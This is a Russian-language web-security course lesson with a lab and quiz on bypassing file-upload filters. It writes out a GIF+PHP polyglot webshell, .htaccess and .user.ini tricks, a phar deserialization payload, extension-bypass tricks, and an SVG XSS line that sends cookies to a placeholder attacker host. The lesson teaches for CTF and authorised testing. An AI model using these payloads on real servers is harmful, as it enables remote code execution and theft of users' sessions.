---
id: web-file-upload-advanced
title: "File-upload advanced: полиглоты, .htaccess, SVG, nginx, phar"
category: web
parent: web-file-upload
difficulty: hard
order: 3
tags: [file-upload, polyglot, htaccess, svg, phar, rce]
prerequisites: [web-file-upload]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 46
summary: "Продвинутый обход загрузки файлов: полиглоты, .htaccess/.user.ini, SVG XSS/XXE, конфиги nginx, phar-десериализация."
lab:
  kind: shell
  title: 'Практика: .htaccess + полиглот → RCE'
  toolset: [core, curl]
  workdir: /home/student/task
  files: [task.md, .htaccess, shell.gif]
  check: 'grep -q ''nto{'' found.txt'
  hints:
    - "Повторение (`web-file-upload`): сначала `xxd -l 8 shell.gif` — `GIF89a` в начале обходит проверку magic bytes."
    - 'Обычный `shell.php` отбивается проверкой magic bytes.'
    - 'Загрузи `.htaccess` с `AddType application/x-httpd-php .gif`.'
    - 'Загрузи полиглот `shell.gif` (начинается с GIF89a, внутри PHP).'
    - 'Обратись к `/uploads/shell.gif?c=cat flag.txt`, запиши ответ в found.txt и набери `check`.'
---

## Вопрос, с которого всё начинается

На базовом уроке мы обходили проверку расширения и MIME. Но современные загрузчики стали строже: белый список картинок, проверка **magic bytes** (первых байтов), иногда перекодирование изображения. Кажется, что залить код невозможно.

Вопрос: как **заставить сервер исполнить** загруженный контент, если обычный `.php` не проходит? Ответ — в четырёх техниках: полиглоты, конфиги сервера, SVG и phar. Разберём их на одном примере.

## Наш пример

Есть сервис с аватарами `profile.example`. Заливаем обычную картинку — принимается. Пробуем `shell.php`:

```bash
$ curl -s -F 'file=@shell.php' https://profile.example/upload
{"error":"only images allowed (jpg/png)"}
$ curl -s -F 'file=@shell.php;type=image/jpeg' https://profile.example/upload
{"error":"not a valid image"}
```

Второй отказ важен: сервер проверил **содержимое**, а не только заголовок. Значит, нужен файл, который действительно картинка — но при этом несёт наш код. Это и есть **полиглот**.

## Техника 1: полиглот (картинка + код)

Полиглот — файл, валидный сразу для двух форматов. Классика — GIF+PHP: PHP-код прячется в конце, а заголовок `GIF89a` проходит проверку magic bytes:

```bash
$ printf 'GIF89a<?php system($_GET["c"]); ?>' > shell.gif
$ curl -s -F 'file=@shell.gif;type=image/gif' https://profile.example/upload
{"url":"/uploads/shell.gif"}
```

Функция `getimagesize` видит `GIF89a` и пропускает файл. Осталось проверить, **исполняется** ли он:

```bash
$ curl -s 'https://profile.example/uploads/shell.gif?c=id'
GIF89a
```

Сервер отдал `GIF89a` как текст — **не исполнил**. Полиглот прошёл проверку, но `.gif` не мапится на PHP. Значит, нужен второй приём — заставить сервер считать `.gif` скриптом.

## Техника 2: `.htaccess` и `.user.ini`

Если загрузчик принимает файлы, начинающиеся с точки, можно **изменить поведение сервера**. `.htaccess` — это конфиг Apache, который читается в каждой директории:

```apache
AddType application/x-httpd-php .gif
```

Загружаем `.htaccess`, затем наш `shell.gif`, затем вызываем:

```bash
$ printf 'AddType application/x-httpd-php .gif\n' > .htaccess
$ curl -s -F 'file=@.htaccess' https://profile.example/upload
$ curl -s -F 'file=@shell.gif' https://profile.example/upload
$ curl -s 'https://profile.example/uploads/shell.gif?c=id'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Теперь Apache считает `.gif` PHP-скриптом, и наш полиглот исполняется. Для PHP-FPM (nginx) аналог — `.user.ini` со строкой `auto_prepend_file=shell.gif`: он подключает наш файл перед каждым скриптом в директории.

## Техника 3: SVG — картинка, которая исполняет

SVG — это **векторная графика в формате XML**. Браузер её рендерит, а значит, встроенный `<script>` выполнится — это **stored XSS**:

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>fetch('https://ATTACKER/?c='+document.cookie)</script>
</svg>
```

```bash
$ curl -s -F 'file=@evil.svg;type=image/svg+xml' https://profile.example/avatar
{"url":"/uploads/evil.svg"}
```

Если SVG отдаётся с `Content-Type: image/svg+xml` и открывается напрямую — чужой браузер исполнит скрипт. А поскольку SVG — XML, туда же помещается внешняя сущность (XXE) и `href` на внутренний URL (SSRF). Загрузка картинки превращается в атаку на тех, кто её смотрит.

## Техника 4: phar — десериализация через загруженный файл

Phar-архив можно замаскировать под картинку (stub `GIF89a`), а внутри положить **метаданные с POP-цепочкой**. При обращении к `phar://` (через любую файловую функцию) метаданные десериализуются → RCE:

```bash
$ ./phpggc -p phar -o shell.jpg Monolog/RCE1 system id
$ curl -s -F 'file=@shell.jpg;type=image/jpeg' https://profile.example/upload
$ curl -s "https://profile.example/avatar?src=phar://uploads/shell.jpg/x"
```

Расширение неважно — важно, что файл валидный phar. Так «загрузка картинки + любое чтение по управляемому пути» становится RCE (см. `web-php-deser-chains`).

## Техника 5: обход фильтров расширений

Если до `.htaccess` дело не дошло, попробуй обойти саму проверку расширения:

| Фильтр | Обход |
|--------|-------|
| Чёрный список `.php` | `.phtml`, `.php5`, `.pht`, `.phar` |
| Белый список картинок | полиглот + `.htaccess`/`.user.ini` |
| `Content-Type` | подменить на `image/jpeg` |
| Magic bytes | `GIF89a;` в начале |
| Двойное расширение | `shell.php.jpg`, `shell.jpg.php` |
| Регистр | `shell.PHP`, `shell.pHp` |
| Trailing dot/space | `shell.php.`, `shell.php ` |
| Null byte | `shell.php%00.jpg` (старые версии) |

## Техника 6: конфиг nginx

В nginx нет `.htaccess`, но опасен сам конфиг. Если загруженный `.php` попадает в директорию, которую «достаёт» PHP-локейшен, он исполняется:

```nginx
location /uploads/ { root /var/www; }
location ~ \.php$ { fastcgi_pass ...; }   # это правило может дотянуться до uploads
```

Проверка — прямая:

```bash
$ curl -s -F 'file=@shell.php' https://profile.example/upload
$ curl -s 'https://profile.example/uploads/shell.php?c=id'
# если 200 и вывод id -> конфиг опасен
```

## Порядок проверки загрузчика

Чтобы не тратить запросы вслепую, иди по шагам и фиксируй ответ на каждом:

| Шаг | Что проверяем | Признак |
|-----|---------------|---------|
| 1 | какие расширения принимаются | ответ `ok`/`error` |
| 2 | проверяется ли содержимое | `not a valid image` |
| 3 | доступен ли файл по URL | `curl` отдаёт содержимое |
| 4 | исполняется ли файл | вывод команды вместо текста |
| 5 | принимается ли `.htaccess`/`.user.ini` | файл загрузился |
| 6 | куда попадает файл | путь в ответе `/uploads/...` |

```bash
# минимальная серия проверок
$ curl -s -F 'file=@test.jpg' https://profile.example/upload
$ curl -s -F 'file=@test.php' https://profile.example/upload
$ curl -s -F 'file=@test.php.jpg' https://profile.example/upload
$ curl -s -F 'file=@test.jpg;type=application/x-php' https://profile.example/upload
```

Ключевой вопрос — **шаг 4**. Загрузка сама по себе ничего не доказывает: нужен запрос к загруженному файлу, который вернёт вывод команды. Пока этого нет, находка остаётся «suspected», а не «RCE». И помни про гигиену: перед запуском скачанного PoC или чужого `.htaccess` прочитай его — это недоверенный контент.

## Что мы теперь знаем

- Строгий загрузчик проверяет **содержимое** (magic bytes), не только имя и заголовок.
- **Полиглот** — файл, валидный и как картинка, и как код.
- **`.htaccess`/`.user.ini`** меняют обработку расширений → полиглот исполняется.
- **SVG** — XML: даёт stored XSS, XXE и SSRF.
- **phar** под картинкой триггерит десериализацию через `phar://`.
- Обходы расширений: альтернативные, двойные, регистр, trailing-символы.
- Артефакт — `uid=33(www-data)` из загруженного файла, а не «файл загрузился».

## На что смотреть дальше

- **Ключевой вопрос — исполняется ли файл**, а не «прошла ли загрузка». Всегда вызывай загруженный файл.
- **Если директория принимает `.htaccess`/`.user.ini`** — это часто прямее, чем подбор расширения.
- **Проверь nginx:** попадает ли uploads под PHP-локейшен.
- **Не игнорируй SVG** — даже без RCE он даёт XSS на всех, кто откроет картинку.
- **phar** связывает загрузку с десериализацией — проверь файловые функции с параметром-путём.
- **Только с согласия.** Заливка webshell — изменение прода.

## Квиз

Проверь себя.

```quiz
- question: "Что такое полиглот-файл?"
  options:
    - "Архив"
    - "Файл, валидный одновременно как изображение и как скрипт"
    - "Шифр"
    - "Cookie"
  answer: 1
  explanation: "Он проходит проверку содержимого 'это картинка', но несёт код."
- question: "Что делает `.htaccess` со строкой `AddType application/x-httpd-php .gif`?"
  options:
    - "Сжимает вывод"
    - "Заставляет Apache исполнять `.gif` как PHP"
    - "Шифрует файлы"
    - "Кеширует страницу"
  answer: 1
  explanation: "Конфиг меняет обработку расширений в директории."
- question: "Что задаёт `.user.ini` в PHP-FPM?"
  options:
    - "TLS-сертификат"
    - "`auto_prepend_file` — подключает файл перед каждым скриптом"
    - "DNS-сервер"
    - "Cookie"
  answer: 1
  explanation: "Триггерит подключение загруженного файла к каждому запросу."
- question: "Чем опасен загружаемый SVG?"
  options:
    - "Он большой по размеру"
    - "SVG — это XML: возможен stored XSS, XXE и SSRF"
    - "Он шифрует данные"
    - "Он кешируется"
  answer: 1
  explanation: "XML-контекст даёт выполнение JS и обработку внешних сущностей."
- question: "Как связаны upload и phar?"
  options:
    - "Никак"
    - "Загруженный phar триггерит десериализацию при обращении к `phar://`"
    - "Через TLS"
    - "Через DNS"
  answer: 1
  explanation: "Метаданные phar десериализуются — цепочка POP → RCE."
```

## Куда дальше

Дальше мы разберём инъекции уже не в PHP/шаблоны, а в **сам Node.js** — где опасны шаблонизаторы EJS/Pug и прямые вызовы `child_process` (`web-nodejs-injection`). А пока главное запомни: продвинутая загрузка — это **не про расширение, а про то, как сервер обрабатывает загруженное**.

## Где пригодится

- **CTF (Web):** задачи на загрузку.
- **Bug bounty:** upload→RCE — критичный отчёт.
- **Пентест:** аудит файловых операций.
- **Работа (AppSec):** allowlist типов, хранение вне веб-рута, перекодирование изображений, запрет .htaccess/SVG.
